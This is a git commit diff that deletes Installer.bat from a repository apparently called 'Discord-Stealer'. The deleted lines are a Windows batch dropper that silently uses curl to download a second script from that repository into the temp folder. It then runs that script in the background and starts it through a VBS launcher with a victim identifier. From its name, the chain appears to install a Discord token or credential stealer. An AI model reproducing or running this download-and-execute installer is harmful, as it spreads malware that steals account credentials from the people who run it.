2aa94330041d06aa6c51be7f07ef9c103275508c
agamsol <43265196+agamsol@users.noreply.github.com>
2021-09-29 20:38:27 +0300

    Delete Installer.bat

--- 2.0/Installer.bat
+++
@@ -1,7 +0,0 @@
-@echo off
-set Identifier=%~1
-set "Save=%temp%\"
-curl --create-dirs -sf#kLo "%Save%DAS.bat" "https://raw.githubusercontent.com/agamsol/Discord-Stealer/main/2.0/DAS.bat"
-call "%Save%DAS.bat" --Background
-call "%Save%background.vbs" "%Save%DAS.bat" "%Identifier%"
-exit /b
